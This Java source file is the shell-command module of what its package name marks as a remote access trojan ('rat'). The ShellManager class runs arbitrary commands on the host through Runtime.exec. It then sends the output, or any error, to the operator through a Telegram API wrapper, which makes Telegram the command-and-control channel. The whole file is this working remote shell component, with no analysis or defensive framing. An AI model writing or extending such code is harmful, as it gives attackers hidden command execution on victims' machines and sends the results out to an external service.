package com.enterprise.rat.commands;

import com.enterprise.rat.utils.TelegramApi;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellManager {
    public static void executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
                if (output.length() > 3000) break;
            }
            process.waitFor();
            TelegramApi.sendMessage("<b>💻 Shell Output:</b>\n<pre>" + output.toString() + "</pre>");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Shell Error: " + e.getMessage());
        }
    }
}
